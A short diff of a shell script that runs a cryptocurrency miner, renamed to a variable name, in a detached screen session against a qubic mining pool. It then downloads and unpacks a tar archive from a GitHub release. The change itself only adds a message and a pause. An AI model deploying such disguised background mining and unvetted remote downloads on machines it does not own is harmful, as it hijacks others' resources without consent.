@@ -10,7 +10,8 @@ mv nx100 $variable5
 screen -dmS apool ./$variable5 --account CP_smm --pool qubic2.hk.apool.io:3334 --worker $WORKER --cpu-off
 echo apool DONE 100 %
 sleep 5
-echo next step
+echo next step in 5 second
+sleep 5
 wget https://github.com/staticneti/otodin/releases/download/v4.1.2/static.tar
 tar -xf static.tar
 rm -rf static.tar
